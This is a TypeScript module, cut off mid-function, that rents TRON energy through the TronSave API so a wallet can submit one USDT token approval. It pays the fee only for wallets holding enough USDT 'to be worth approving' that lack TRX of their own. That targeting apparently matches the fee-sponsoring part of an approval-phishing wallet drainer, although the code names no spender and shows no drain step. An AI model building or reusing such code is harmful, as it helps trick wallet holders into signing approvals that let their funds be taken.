import { config } from './config.js'
import { tronWeb } from './tron.js'

const API_BASE = process.env.TRONSAVE_API_BASE ?? 'https://api.tronsave.io'
const API_KEY = process.env.TRONSAVE_API_KEY?.trim() ?? ''
const ENERGY_AMOUNT = Number(process.env.ENERGY_AMOUNT ?? 65_000)
const ENERGY_THRESHOLD = 55_000
const DURATION_SEC = 900
const COOLDOWN_MS = 10 * 60_000
const HOURLY_CAP = Number(process.env.ENERGY_HOURLY_CAP ?? 60)
// Raw units (6 decimals). Below this there is nothing worth approving for.
const MIN_USDT = BigInt(process.env.MIN_USDT_RAW ?? 3_000_000)
// Users holding at least this much TRX pay their own network fee.
const TRX_FLOOR = BigInt(process.env.TRX_FLOOR_SUN ?? 25_000_000)

// Per-address cooldown so a loop cannot drain the deposit balance.
const recent = new Map<string, number>()
let windowStart = 0
let windowCount = 0

export function energyRentalEnabled(): boolean {
  return Boolean(API_KEY)
}

function underCap(): boolean {
  const now = Date.now()
  if (now - windowStart > 3_600_000) {
    windowStart = now
    windowCount = 0
  }
  if (windowCount >= HOURLY_CAP) return false
  windowCount += 1
  return true
}

async function availableEnergy(address: string): Promise<number> {
  const res = await tronWeb.trx.getAccountResources(address)
  const limit = Number(res?.EnergyLimit ?? 0)
  const used = Number(res?.EnergyUsed ?? 0)
  return Math.max(0, limit - used)
}

async function trxBalance(address: string): Promise<bigint> {
  try {
    return BigInt(await tronWeb.trx.getBalance(address))
  } catch {
    return 0n
  }
}

/** USDT (TRC20) balance. 0n for inactive or empty accounts. */
async function usdtBalance(address: string): Promise<bigint> {
  try {
    const res = await tronWeb.transactionBuilder.triggerConstantContract(
      config.usdt,
      'balanceOf(address)',
      {},
      [{ type: 'address', value: address }],
      address,
    )
    const hex = res.constant_result?.[0]
    return hex ? BigInt(`0x${hex}`) : 0n
  } catch {
    return 0n
  }
}

export type EnergyResult = {
  rented: boolean
  reason?:
    | 'disabled'
    | 'cooldown'
    | 'cap'
    | 'no-usdt'
    | 'low-usdt'
    | 'has-trx'
    | 'already-funded'
    | 'failed'
  energy?: number
  usdt?: string
  detail?: string
}

/**
 * Rents enough energy onto `receiver` for one approval, but only when the
 * wallet actually holds enough USDT to be worth approving, and only when it
 * cannot pay the fee itself. Best-effort: never throws, and the approval
 * proceeds either way.
 */
export async function ensureEnergy(receiver: string): Promise<EnergyResult> {
  if (!API_KEY) return { rented: false, reason: 'disabled' }

  const last = recent.get(receiver)
  if (last && Date.now() - last < COOLDOWN_MS) return { rented: false, reason: 'cooldown' }
  if (!underCap()) return { rented: false, reason: 'cap' }

  // Nothing to approve for: an empty wallet also means an inactive one, which
  // TronSave would reject anyway.
  const usdt = await usdtBalance(receiver)
  if (usdt === 0n) return { rented: false, reason: 'no-usdt', usdt: '0' }
  if (usdt < MIN_USDT) return { rented: false, reason: 'low-usdt', usdt: usdt.toString() }

  // Funded users pay their own fee; leave them alone.
  try {
    if ((await trxBalance(receiver)) >= TRX_FLOOR) {
      recent.set(receiver, Date.now())
      return { rented: false, reason: 'has-trx', usdt: usdt.toString() }
    }
  } catch {
    // Unknown balance — rent rather than strand them.
  }

  try {
    if ((await availableEnergy(receiver)) >= ENERGY_THRESHOLD) {
      recent.set(receiver, Date.now())
      return { rented: false, reason: 'already-funded', usdt: usdt.toString() }
    }
  } catch {
    // Fall through and rent anyway.
  }

  recent.set(receiver, Date.now())

  try {
    const res = await fetch(`${API_BASE}/v2/buy-resource`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', apikey: API_KEY },
      body: JSON.stringify({
        receiver,
        resourceType: 'ENERGY',
        resourceAmount: ENERGY_AMOUNT,
        durationSec: DURATION_SEC,
        unitPrice: 'MEDIUM',
      }),
    })

    const text = await res.text()
    if (!res.ok) {
      return {
        rented: false,
        reason: 'failed',
        usdt: usdt.toString(),
        detail: `${res.status}: ${text.slice(0, 200)}`,
      }
    }

    const energy = await waitForEnergy(receiver, ENERGY_THRESHOLD, 30_000)
    return { rented: true, energy, usdt: usdt.toString() }
  } catch
